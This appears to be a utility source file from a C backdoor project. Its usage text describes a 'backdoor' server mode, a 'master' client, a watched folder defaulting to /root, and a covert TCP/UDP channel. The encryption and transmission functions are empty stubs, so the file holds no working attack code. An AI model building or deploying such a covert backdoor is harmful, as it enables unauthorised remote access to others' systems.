/*
 * util.c
 *
 *  Created on: May 16, 2014
 *      Author: root
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <openssl/des.h>
#include <openssl/evp.h>

#include "util.h"

void error(const char *err) {
	fprintf(stderr, "ERROR => %s\n", err);
	exit(1);
}

void usage(char *name) {
	printf("Usage: %s [options]\n", name);
	printf(" -c Use client mode: Act as master.\n");
	printf(" -s Use server mode: Act as backdoor. [default]\n");
	printf(" -h Show this help listing.\n");
	printf(
			" -i <arg> Remote host address for client mode. [default=127.0.0.1]\n");
	printf(" -w <arg> Folder to watch. [default=/root]\n");
	printf(" -x [tu] Covert channel to use(TCP OR UDP). [default=TCP]\n");
	printf(" EXAMPLES:\t %s -c -i 192.168.0.1 -x t\n", name);
	printf(" EXAMPLES:\t %s -s -i 192.168.0.2 -x t\n", name);

	exit(0);
}

FILE* open_file(char* fname, uint8 writeMode) {
	FILE *file;

	if (writeMode) {
		if ((file = fopen(fname, "wb")) == NULL)
			error("Error opening open input file.");
	} else {
		if ((file = fopen(fname, "rb")) == NULL)
			error("Error opening open output file.");
	}

	return file;
}

void encrypt(char *key, char *msg, int size) {
}

void decrypt(char *key, char *msg, int size) {
}

char* buildTransmission(char *data, int *len, char type) {
	char *buff;

	return buff;
}

char* getTransmission(char *packet, int *len, char *type) {
	char *data;
	char *ptr;
	char md5[MD5_LEN];
	int pass_len;
	int tot_len;
	int data_len;



	return data;
}
